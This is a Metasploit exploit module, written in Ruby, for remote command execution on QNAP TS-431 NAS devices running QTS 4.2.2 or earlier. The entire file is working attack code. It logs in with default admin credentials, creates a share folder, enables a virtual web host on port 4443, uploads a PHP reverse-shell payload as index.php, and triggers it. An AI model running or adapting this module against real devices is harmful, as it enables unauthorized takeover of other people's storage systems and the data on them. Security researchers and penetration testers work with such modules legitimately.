# This module requires Metasploit: http://metasploit.com/download 
# Current source: https://github.com/rapid7/metasploit-framework 
## 

require &#039;base64&#039; 

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking 
 
  include Msf::Exploit::Remote::HttpClient 
 
    def initialize 
    super( 
      &#039;Name&#039;           => &#039;QNAP TS-431 QTS < 4.2.2 - Remote Command Execution&#039;, 
      &#039;Description&#039;    => %q{ 
        This module creates a virtual web server and uploads the php payload into it. 
        Admin privileges cannot access any server files except File Station files.  
        The user who is authorized to create Virtual Web Server can upload malicious php file by activating the server.
        Exploit creates a new directory into File Station to connect to the web server.
        However, only the "index.php" file is allowed to work in the virtual web server directory.
        No files can be executed except "index.php". Gives an access error.
        After the harmful "index.php" has been uploaded, the shell can be retrieved from the server.
        There is also the possibility of working in higher versions. 
      }, 
      &#039;Author&#039;         => [ 
        &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Vulnerability Discovery, PoC & Msf Module 
        ], 
      &#039;License&#039;        => MSF_LICENSE, 
      &#039;References&#039;     => 
        [
          [&#039;URL&#039;, &#039;https://pentest.com.tr/exploits/QNAP-QTS-4-2-2-Remote-Command-Execution-Metasploit.html&#039;],  
        ], 
      &#039;Platform&#039;       => [&#039;php&#039;], 
      &#039;Arch&#039;           => ARCH_PHP, 
      &#039;Targets&#039;        => 
        [ 
          [&#039;QNAP QTS <= 4.2.2&#039;, {}] 
        ], 
      &#039;DisclosureDate&#039; => &#039;06 March 2019&#039;, 
      &#039;Privileged&#039;     => false,       
      &#039;DefaultTarget&#039; => 0 
    ) 
 
    register_options( 
        [ 
          OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, false]),
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to QNAP&#039;, &#039;/&#039;]), 
          OptString.new(&#039;USER&#039;, [true, &#039;User to login with&#039;, &#039;admin&#039;]), 
          OptString.new(&#039;PASS&#039;, [true, &#039;Password to login with&#039;, &#039;admin&#039;]), 
        ], self.class) 
    end 
##
# Check Exploit Vulnerable
##  
  def check
    res = send_request_cgi({ 
      &#039;method&#039; => &#039;GET&#039;,  
      &#039;uri&#039;    => normalize_uri(target_uri, "/cgi-bin/login.html")      
    })

   if res and res.code == 200 and res.body =~ /dc=4.2./
      return Exploit::CheckCode::Vulnerable
   else
      return Exploit::CheckCode::Safe
    end
    return res 
  end  
##
# Login
##  
  def exploit 
 
    b64pwd = Base64.encode64("#{datastore[&#039;PASS&#039;]}")
    b64 = b64pwd.split(&#039;=&#039;).first
 
    res = send_request_cgi({ 
      &#039;method&#039; => &#039;POST&#039;, 
      &#039;uri&#039;    => normalize_uri(target_uri, "/cgi-bin/authLogin.cgi"), 
      &#039;vars_post&#039; => { 
          "user" => datastore[&#039;USER&#039;],
          "pwd" => "#{b64}=",
          "serviceKey" => "1"           
      } 
    })

    if res and res.code == 200 and res.body =~ /authSid/
      print_good("Login successful")
      nasid = res.body.split("authSid><![CDATA[")[1].split("]")[0]
      print_status("sid = #{nasid}")
    else
      print_error("Login failed")
    end
##
# Update Login Time with sid
## 
    cookie = "NAS_USER=#{datastore[&#039;USER&#039;]}; NAS_SID=#{nasid}; home=1; showQuickStart=1"
    res = send_request_cgi({ 
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie, 
      &#039;uri&#039;    => normalize_uri(target_uri, "/cgi-bin/userConfig.cgi"), 
      &#039;vars_post&#039; => { 
          "func" => "updateLoginTime",
          "sid" => "#{nasid}"          
      } 
    })

    if res and res.code == 200 and res.body =~ /true/
      print_good("Update Login Time Successful")
    else
      print_error("Update failed")
    end
 
##
# Create Folder in File Station for Web Server
## 
    cmdfile = "cmd#{rand_text_alphanumeric(rand(5) + 5)}"
    print_status("Web Folder = /#{cmdfile}")
    print_status("Attempting to create a folder via File Station.")
    res = send_request_cgi({ 
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie, 
      &#039;uri&#039;    => normalize_uri(target_uri, "/cgi-bin/wizReq.cgi?&wiz_func=share_create&action=add_share"), 
      &#039;vars_post&#039; => { 
          "share_name" => cmdfile,
          "comment" => "",
          "guest" => "deny",
          "hidden" => "0",
          "oplocks" => "1",
          "EncryptData" => "0",
          "wizard_filter" => "",
          "user_wizard_filter" => "",
          "userw0" => "#{datastore[&#039;USER&#039;]}",
          "userd_len" => "0",
          "userw_len" => "1",
          "usero_len" => "0",
          "access_r" => "setup_users",
          "img_file_path" => "",
          "path_type" => "auto",
          "quotaSettings" => "",
          "quota_size" => "",
          "recycle_bin" => "1",
          "recycle_bin_administrators_only" => "0",
          "quotaRadio" => "0",
          "vol_no" => "1",
          "addToMediaFolder" => "0",
          "qsync" => "0",
          "sid" => "#{nasid}"          
      } 
    })

    if res and res.code == 200 and res.body =~ /buildTime/
      print_good("File Create Successful")
    else
      print_error("File Create Failed")
    end
##
# Enable Virtual Host
## 
    print_status("Attempting to Enable Virtual Host")
    res = send_request_cgi({ 
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie, 
      &#039;uri&#039;    => normalize_uri(target_uri, "/cgi-bin/net/networkRequest.cgi?&subfunc=web_srv&apply=1&todo=set_enable"), 
      &#039;vars_post&#039; => { 
          "enable" => "1",
          "sid" => "#{nasid}"          
      } 
    })

    if res and res.code == 200
      print_good("Virtual Host Enabled")
    else
      print_error("Process Failed")
    end 
##
# Enable Virtual Host
##
    print_status("Attempting to Create Virtual Host")
    res = send_request_cgi({ 
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie, 
      &#039;uri&#039;    => normalize_uri(target_uri, "/cgi-bin/net/networkRequest.cgi?&subfunc=web_srv"), 
      &#039;vars_post&#039; => { 
          "apply" => "1",
          "share_folder" => "1",
          "manual_path" => cmdfile,
          "vhost_name" => "cmd",
          "vhost_port" => "4443",
          "vhost_ssl" => "0",
          "todo" => "add_vhost",
          "sid" => "#{nasid}"          
      } 
    })

    if res and res.code == 200
      print_good("Virtual Host Started on port 4443")
    else
      print_error("Process Failed")
    end
##
# Fetching upload_id information
##
    print_status("Attempting to Upload get Upload ID")
    res = send_request_cgi({ 
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie, 
      &#039;uri&#039;    => normalize_uri(target_uri, "/cgi-bin/filemanager/utilRequest.cgi?func=start_chunked_upload"), 
      &#039;vars_post&#039; => { 
          "upload_root_dir" => "/#{cmdfile}",
          "sid" => "#{nasid}"          
      } 
    })

    if res and res.code == 200 and res.body =~ /upload_id/
      print_good("Login successful")
      uploadid = res.body.split("upload_id")[1].split(&#039;"&#039;)[2]
      print_status("Upload ID = #{uploadid}")
    else
      print_error("Login failed")
    end
##
# Upload Payload
##
    boundary = Rex::Text.rand_text_alphanumeric(29)

    data = "-----------------------------{boundary}"
    data << "\r\nContent-Disposition: form-data; name=\"fileName\"\r\n\r\n"
    data << "msf.php\r\n-----------------------------{boundary}"
    data << "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
    data << "Content-Type: application/octet-stream\r\n\r\n"
    data << payload.encoded
    data << "\r\n-----------------------------{boundary}--\r\n"

    print_status("Attempting to Upload Payload to Reverse Shell")

    res = send_request_raw(
      {
        &#039;method&#039; => "POST",
        &#039;uri&#039;     => normalize_uri(target_uri, "/cgi-bin/filemanager/utilRequest.cgi?sid=#{nasid}&func=chunked_upload&dest_path=/#{cmdfile}&overwrite=1&upload_root_dir=/#{cmdfile}&upload_id=#{uploadid}&offset=0&filesize=1115&upload_name=index.php&settime=1&mtime=1551868245"),
        &#039;data&#039; => data,
        &#039;headers&#039; =>
        {
          &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=---------------------------{boundary}&#039;,
        },
        &#039;cookie&#039;  => cookie
      })

    if res and res.code == 200 
      print_good("Payload Uploaded Successful")
    else
      print_error("Upload Failed")
    end
##
# Execute the Payload
##
    print_status("Attempting to execute the payload...")

    res = request_url("http://#{rhost}:4443/index.php")

    if res and res.code == 200
      print_good "Payload executed successfully"
    end  
  end     
end
##
# End
##

